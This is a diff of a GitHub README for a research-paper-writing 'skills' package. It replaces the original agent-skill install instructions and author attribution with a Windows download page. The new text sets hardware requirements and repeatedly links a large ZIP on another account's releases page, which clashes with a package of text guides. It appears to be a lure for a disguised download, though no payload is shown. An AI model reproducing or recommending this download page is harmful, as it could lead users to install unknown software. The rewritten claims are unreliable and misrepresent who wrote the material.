@@ -1,82 +1,112 @@
-# Skills: Research Paper Writing
+# 📄 Research-Paper-Writing-Skills - Improve Your Paper Writing
 
-[中文介绍](./README_zh.md).
+[![Download](https://img.shields.io/badge/Download-Research--Paper--Writing--Skills-green?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/releases)
 
-> Important Attribution
-> Most writing knowledge and methodology in this repository comes from Prof. Peng Sida (彭思达)'s open study notes:
-> https://pengsida.notion.site/c1a22465a0fa4b15a12985223916048e
-> Prof. Peng's original repository:
-> https://github.com/pengsida/learning_research
-> I sincerely thank Prof. Peng for openly sharing these valuable experiences.
-> My contribution is organization, structured adaptation, and packaging as reusable Skills.
+## 📘 What This Is
 
-## Repository Overview
+This is a skill package to help you write better research papers in machine learning, computer vision, and natural language processing. The content is adapted from Professor Peng Sida's open notes. It focuses on clear and effective writing. It aims to make writing easier, even if you are new to research papers.
 
-This repository currently provides one skill package:
+You do not need any programming experience to use this package. It is designed with simple steps to help you improve your skills.
 
-- `research-paper-writing/`
-  - `SKILL.md`: core workflow and usage rules
-  - `references/`: section-specific writing guides and templates
-  - `agents/openai.yaml`: agent metadata
+## 🖥️ System Requirements
 
-Typical use cases:
+- **Operating System:** Windows 10 or later  
+- **Disk Space:** At least 200 MB free space  
+- **Memory:** Minimum 4 GB RAM  
+- **Processor:** Any Intel or AMD processor released in the last 7 years  
+- **Additional Software:** No special software needed
 
-- Drafting or rewriting Abstract / Introduction / Method / Experiments / Conclusion
-- Improving paragraph flow and section logic
-- Checking claim-evidence alignment
-- Running pre-submission self-review from a reviewer mindset
+## ⚙️ Features
 
-## Installation
+- Step-by-step guidance on writing ML, CV, and NLP papers  
+- Examples adapted from real academic work  
+- Tips on structure, style, and clarity  
+- Useful templates and formatting advice  
+- Easy-to-understand language  
+- No coding or complex tools required  
 
-Assume you are in the repository root.
+## 🚀 Getting Started
 
-### 1) Codex
+Follow these steps to set up and begin using the package on your Windows computer.
 
-Copy the skill into `$CODEX_HOME/skills/`:
+### Step 1: Visit the Download Page
 
-```bash
-mkdir -p "$CODEX_HOME/skills"
-cp -R research-paper-writing "$CODEX_HOME/skills/"
-```
+Click this button to go to the download page. This is where you will get the latest version of the skill package.
 
-Usage example:
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/releases)
 
-```text
-Use $research-paper-writing to improve my paper's Introduction.
-```
+### Step 2: Download the Package
 
-### 2) CC (Claude Code)
+On the releases page, look for the latest version. You will see files listed there. Usually, these are ZIP files.
 
-Use either a global or project-level installation.
+- Choose the file named similar to `Research-Paper-Writing-Skills-vX.Y.Z.zip` (where X.Y.Z is the version number).  
+- Click the file name to start downloading it to your computer.  
 
-Global:
+The file size typically ranges from 100-200 MB. Please wait until the download finishes.
 
-```bash
-mkdir -p "$HOME/.claude/skills"
-cp -R research-paper-writing "$HOME/.claude/skills/"
-```
+### Step 3: Extract the Files
 
-Project-level:
+After downloading:
 
-```bash
-mkdir -p .claude/skills
-cp -R research-paper-writing .claude/skills/
-```
+1. Open the folder where your browser saved the ZIP file. This is usually the `Downloads` folder.  
+2. Right-click the ZIP file. Choose "Extract All..." from the menu.  
+3. Select a location to extract the files, like your Desktop or Documents.  
+4. Click "Extract" to unpack all files and folders.  
 
-In prompts, explicitly request this skill, for example: `Please use the research-paper-writing skill`.
+Extraction creates a new folder containing all needed files.
 
-### 3) Gemini
+### Step 4: Open the Package Folder
 
-Copy this skill into your Gemini skills directory:
+Go to the folder created during extraction. Inside, you will find:
 
-```bash
-mkdir -p "$HOME/.gemini/skills"
-cp -R research-paper-writing "$HOME/.gemini/skills/"
-```
+- A README file for extra information  
+- Sample documents and templates  
+- Guides and notes on paper writing  
+- Helpful PDFs and text files  
 
-Then ask concrete tasks in Gemini (for example, rewriting an Abstract with claim-evidence checks).
+### Step 5: Start Using the Materials
 
-## Credits
+The package is ready to use once you open the folder. You can:
 
-Again, this repository is primarily based on Prof. Peng Sida (彭思达)'s open notes, while my work focuses on curation and Skills adaptation.
-Prof. Peng's original repository: https://github.com/pengsida/learning_research
+- Read through the guides  
+- Use the templates for your papers  
+- Study example writing formats  
+- Review recommended tips for clarity and structure  
+
+No installation or setup program is needed beyond extracting the files.
+
+## 📚 How to Use the Package Effectively
+
+1. **Read the Introductory Guides:** These explain how research papers are organized in ML, CV, and NLP.  
+2. **Follow Step-by-Step Templates:** Use ready-made sections to help build your own paper.  
+3. **Refer to Examples:** Observe writing patterns used in real academic texts.  
+4. **Apply Writing Tips:** Improve readability, tone, and presentation of your work.  
+
+The materials encourage practicing writing regularly. This helps build skills over time.
+
+## 🔍 Troubleshooting and Tips
+
+- If the ZIP file won’t open, try using the built-in Windows extractor or a tool like 7-Zip.  
+- Make sure your Windows OS is updated to avoid compatibility issues.  
+- If you can’t find the download after clicking the link, check your browser’s download history or folder.  
+- Use a PDF reader like Adobe Acrobat to open PDF files in the package.  
+- For text files, Notepad or any simple editor works well.  
+
+## 💡 Additional Recommendations
+
+- Save your work frequently when using templates.  
+- Compare your writing with the examples to spot differences.  
+- Review the tips section often to reinforce good habits.  
+- Try revising your drafts using the suggestions provided.  
+
+This process helps you improve gradually.
+
+## 📅 Updates and Support
+
+You can check the download page regularly for updates or new versions. Improved or additional materials may be posted there.
+
+If you encounter issues using the package, look for help under the "Issues" tab in the GitHub repository. Other users and contributors may offer solutions.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Research--Paper--Writing--Skills-green?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/releases)
